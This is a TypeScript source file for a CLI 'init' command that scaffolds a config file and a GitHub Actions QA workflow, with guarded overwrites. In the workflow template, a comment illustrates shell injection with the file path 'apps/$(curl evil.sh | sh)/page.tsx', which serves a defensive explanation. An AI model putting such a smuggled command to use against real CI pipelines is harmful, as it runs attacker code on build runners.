import { promises as fs } from 'node:fs';
import path from 'node:path';
import { CLI_COMMAND_PREFIX, CLI_PACKAGE } from '@warden/core';

/**
 * What `init` did to one file.
 *
 * `kept` is the honest answer when a file on disk differs from the template and nothing
 * confirmed replacing it: the scaffold did not happen, and the caller has to say so rather
 * than report a success it did not perform.
 */
export type InitFileStatus = 'created' | 'unchanged' | 'overwritten' | 'kept';

/** One scaffolded path and what happened to it. */
export interface InitFileOutcome {
  path: string;
  status: InitFileStatus;
}

/** Options for {@link runInit}. */
export interface RunInitOptions {
  /** Directory to scaffold `warden.config.ts` and `.github/workflows/ai-qa.yml` into. */
  cwd: string;
  /**
   * Replace existing, customized files without asking. `confirmOverwrite` is not consulted
   * when this is set — `--force` is the confirmation.
   */
  force?: boolean;
  /**
   * Asked once per file that exists and differs from the template. Returning `false` — which
   * is also what omitting this does — keeps the file on disk untouched. A destructive default
   * cannot be undone by a later flag, so the answer with no answerer is "no".
   */
  confirmOverwrite?: (filePath: string) => boolean | Promise<boolean>;
}

/** Return value of {@link runInit}. */
export interface RunInitResult {
  configPath: string;
  workflowPath: string;
  /** Per-file outcomes, config first, in the order they were written. */
  files: InitFileOutcome[];
}

const CONFIG_TEMPLATE = `/**
 * Warden configuration. Every field is optional and has a sensible default, so you can
 * delete anything you don't need. Full reference:
 * https://github.com/QuintinBotes/warden/blob/main/docs/configuration.md
 *
 * This starter is import-free so it works immediately, even from a one-off
 * \`${CLI_COMMAND_PREFIX} init\`. Once you've added ${CLI_PACKAGE} as a dependency you can
 * switch to the typed helper:
 *
 *   import { defineConfig } from '@warden/core';
 *   export default defineConfig({ ... });
 *
 * Warden parses this file as data and never executes it, so keep it to literal values — no
 * function calls, no process.env, no template substitutions. (A computed config needs
 * WARDEN_TRUST_CONFIG=1, which is only safe on a checkout you vouch for.)
 *
 * @type {import('@warden/core').WardenConfigInput}
 */
export default {
  ai: {
    provider: 'anthropic',
    model: 'claude-sonnet-5',
  },
  browser: {
    engine: 'playwright',
  },
  scope: {
    highRiskPatterns: ['auth', 'payment', 'checkout', 'admin'],
    sharedPaths: ['lib/', 'shared/', 'packages/core/'],
    // The trees your modules live in. A changed file under one of these becomes the module
    // named by its first two path segments, and that module's test tag is what the selective
    // tier greps for. Change these to match your repo — 'crates/', 'cmd/', 'libs/', 'services/'
    // — or the selective tier will have no tags to select and will fall back to smoke.
    modulePaths: ['apps/', 'src/features/'],
  },
  tiers: {
    aiExploratory: {
      riskThreshold: 4,
    },
  },
  reporting: {
    ctrf: true,
    githubJobSummary: true,
    prComment: true,
    checkRunAnnotations: true,
  },
  gates: {
    blockOnCritical: true,
    // Blocks the merge when less than this share of results ended green. Skipped and blocked
    // tests count against it, so a run that measured almost nothing cannot read as a pass.
    // It is not a failure allowance — any failing test blocks whatever this says.
    // Set to 0 to switch the rule off.
    blockOnPassRateBelowPercent: 90,
  },
};
`;

const WORKFLOW_TEMPLATE = `# Warden's tiered QA pipeline.
#
# Every step below runs the CLI as:
#
#   ${CLI_COMMAND_PREFIX} <command>
#
# The package is named on purpose. On npm the unscoped name \`warden\` belongs to an unrelated
# package that ships no executable, and a bare name is the spec a launcher resolves.
#
# ${CLI_PACKAGE} is not published to npm yet, so these steps fail with a 404 until it is.
# Until then, build the CLI (see the link below) and call the built binary instead:
#
#   - run: node path/to/warden/packages/cli/dist/bin/warden.js run --grep "@smoke" ...
#
# https://github.com/QuintinBotes/warden/blob/main/docs/cli.md#installing
name: AI QA

# A note on \${{ … }} below: GitHub substitutes an expression into a \`run:\` script as *text*,
# before the shell parses it, so an expression carrying attacker-controlled data is
# attacker-controlled shell. On a \`pull_request\` trigger that includes anything derived from
# the diff — \`test_tags\` is built from the changed files' own paths, so a branch adding
# \`apps/$(curl evil.sh | sh)/page.tsx\` would otherwise run that command on the runner. Every
# expression a step needs is therefore bound to an \`env:\` variable and read as "\$VAR": an
# environment variable is data the shell never re-scans.

on:
  pull_request:

# A tier whose gate BLOCKs exits 1, so its job goes red where the tests are red. The jobs
# after it carry \`if: always()\` so the pipeline still reaches the QA gate, which is what
# posts the decision and the failing tests to the PR.

# The gate posts a PR comment and a check run; without these the aggregate step below
# fails on a 403 instead of reporting a decision.
permissions:
  contents: read
  pull-requests: write
  checks: write

jobs:
  smoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      # \`warden run\` launches the Playwright this repo installed and never downloads one, so the
      # tier needs the dependencies and the browser binaries present before it starts.
      - run: npm ci
      - run: npx playwright install --with-deps
      # A blocking tier exits 1 (see docs/cli.md, "Exit codes"). The tier jobs only
      # produce reports; the qa-gate job below is the single step whose exit code is the
      # merge verdict, so a blocking tier must not skip the jobs that lead to it.
      - run: ${CLI_COMMAND_PREFIX} run --grep "@smoke" --artifacts-dir warden-artifacts/smoke
        continue-on-error: true
      # Every job gets a fresh runner with an empty filesystem, so the gate can only read a
      # tier's CTRF if the tier uploads it. \`if: always()\` because the interesting case is
      # the tier that just failed, and \`if-no-files-found: error\` because a tier that wrote
      # no report at all would otherwise reach the gate as silence — and silence aggregates
      # to "no tests ran", which is a green check that measured nothing.
      - if: always()
        uses: actions/upload-artifact@v4
        with:
          name: warden-ctrf-smoke
          path: warden-artifacts/smoke
          if-no-files-found: error

  analyze:
    needs: smoke
    if: always()
    runs-on: ubuntu-latest
    outputs:
      test_tags: \${{ steps.analyze.outputs.test_tags }}
      risk_score: \${{ steps.analyze.outputs.risk_score }}
      run_full_suite: \${{ steps.analyze.outputs.run_full_suite }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - id: analyze
        env:
          BASE_SHA: \${{ github.event.pull_request.base.sha }}
          HEAD_SHA: \${{ github.sha }}
        run: ${CLI_COMMAND_PREFIX} analyze --base "$BASE_SHA" --head "$HEAD_SHA" --output "$GITHUB_OUTPUT"

  selective:
    needs: analyze
    if: always() && needs.analyze.result == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      # \`warden run\` launches the Playwright this repo installed and never downloads one, so the
      # tier needs the dependencies and the browser binaries present before it starts.
      - run: npm ci
      - run: npx playwright install --with-deps
      # Blocking tier exits 1; the gate job below is what fails the PR. See the smoke job.
      - env:
          # Derived from the pull request's own file paths — never interpolate it into a script.
          TEST_TAGS: \${{ needs.analyze.outputs.test_tags }}
        run: ${CLI_COMMAND_PREFIX} run --grep "$TEST_TAGS" --artifacts-dir warden-artifacts/selective
        continue-on-error: true
      - if: always()
        uses: actions/upload-artifact@v4
        with:
          name: warden-ctrf-selective
          path: warden-artifacts/selective
          if-no-files-found: error

  exploratory:
    needs: analyze
    if: always() && needs.analyze.result == 'success' && fromJson(needs.analyze.outputs.risk_score) >= 4
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      # The secret must match ai.provider in warden.config.ts (OPENAI_API_KEY for 'openai',
      # GEMINI_API_KEY for 'gemini'). With no usable key this step fails; it never stubs the
      # model, because a stubbed report reads exactly like a run that found no bugs.
      #
      # \`warden agent\` writes an AgentOutput, not CTRF, so it is kept out of the directory
      # the gate aggregates and its artifact name deliberately does not match
      # \`warden-ctrf-*\`. Its findings are published for a human to read; they do not
      # contribute to the merge decision, and the gate must not imply that they do.
      - env:
          ANTHROPIC_API_KEY: \${{ secrets.ANTHROPIC_API_KEY }}
          PREVIEW_URL: \${{ vars.PREVIEW_URL }}
          PR_NUMBER: \${{ github.event.pull_request.number }}
        run: ${CLI_COMMAND_PREFIX} agent --strategy exploratory --url "$PREVIEW_URL" --pr-number "$PR_NUMBER" --output warden-agent/exploratory-report.json
      - if: always()
        uses: actions/upload-artifact@v4
        with:
          name: warden-agent-exploratory
          path: warden-agent
          if-no-files-found: error

  qa-gate:
    needs: [selective, exploratory]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      # Pulls every tier's CTRF back onto this runner, one directory per artifact under
      # warden-artifacts/. \`warden report aggregate\` walks that tree, so the nesting is
      # fine; the pattern excludes warden-agent-*, which is not CTRF and would fail to parse.
      - uses: actions/download-artifact@v4
        with:
          pattern: warden-ctrf-*
          path: warden-artifacts
      # An empty download is not a pass. Zero reports aggregate to WARN "no tests ran",
      # which exits 0 — so without this check a pipeline where every tier died would report
      # a green gate. Refuse to gate on nothing instead.
      - name: Refuse to gate on an empty report set
        run: |
          if [ -z "$(find warden-artifacts -type f -name '*.json' 2>/dev/null)" ]; then
            echo "No tier uploaded a CTRF report; refusing to pass a gate that measured nothing." >&2
            exit 1
          fi
      # --head-sha is the PR's head commit, not \$GITHUB_SHA (the merge commit): a required
      # status check is read off the head commit.
      # No continue-on-error: this step's exit code IS the merge gate. It exits 1 when the
      # aggregated decision is BLOCK, which is what turns the PR check red.
      - env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
          # Pull-request data — never interpolate it into a script.
          PR_NUMBER: \${{ github.event.pull_request.number }}
          HEAD_SHA: \${{ github.event.pull_request.head.sha }}
        run: ${CLI_COMMAND_PREFIX} report aggregate --reports warden-artifacts --pr "$PR_NUMBER" --head-sha "$HEAD_SHA"
`;

/**
 * Writes `contents` to `filePath` unless a different file is already there and nothing
 * confirms replacing it.
 *
 * The existence check and the write are deliberately not atomic: an `init` racing another
 * writer is not a threat this guards against. What it guards against is the ordinary case —
 * a second `init` after a version bump — where the file has been on disk, edited, for weeks.
 */
async function writeGuarded(
  filePath: string,
  contents: string,
  opts: RunInitOptions,
): Promise<InitFileOutcome> {
  let existing: string | undefined;
  try {
    existing = await fs.readFile(filePath, 'utf-8');
  } catch (err) {
    // Anything other than "not there" is a real problem and must not read as a fresh install.
    if ((err as NodeJS.ErrnoException).code !== 'ENOENT') throw err;
  }

  if (existing === undefined) {
    await fs.writeFile(filePath, contents, 'utf-8');
    return { path: filePath, status: 'created' };
  }

  // Byte-identical means writing would change nothing, so there is nothing to ask about.
  if (existing === contents) return { path: filePath, status: 'unchanged' };

  const confirmed = opts.force === true || (await opts.confirmOverwrite?.(filePath)) === true;
  if (!confirmed) return { path: filePath, status: 'kept' };

  await fs.writeFile(filePath, contents, 'utf-8');
  return { path: filePath, status: 'overwritten' };
}

/**
 * Scaffolds a starter `warden.config.ts` (import-free, so it loads even before deps are
 * installed) and a sample tiered
 * Scaffolds a starter `warden.config.ts` (import-free literal data, so it loads even before deps
 * are installed and stays inside what the non-executing config reader accepts) and a sample tiered
 * `.github/workflows/ai-qa.yml` (smoke → analyze → selective/exploratory → gate, per blueprint
 * Part IV) into `opts.cwd` — the `create-warden-config` onboarding story.
 *
 * Safe to re-run: a file that already exists and differs from the template is only replaced
 * when `force` is set or `confirmOverwrite` says yes. Each file is decided on its own, so
 * declining one does not skip the other.
 */
export async function runInit(opts: RunInitOptions): Promise<RunInitResult> {
  const configPath = path.join(opts.cwd, 'warden.config.ts');
  const workflowDir = path.join(opts.cwd, '.github', 'workflows');
  const workflowPath = path.join(workflowDir, 'ai-qa.yml');

  await fs.mkdir(workflowDir, { recursive: true });

  // Sequential, not Promise.all: `confirmOverwrite` may be an interactive prompt, and two
  // prompts racing for one stdin interleave into a question the user cannot answer.
  const files: InitFileOutcome[] = [
    await writeGuarded(configPath, CONFIG_TEMPLATE, opts),
    await writeGuarded(workflowPath, WORKFLOW_TEMPLATE, opts),
  ];

  return { configPath, workflowPath, files };
}
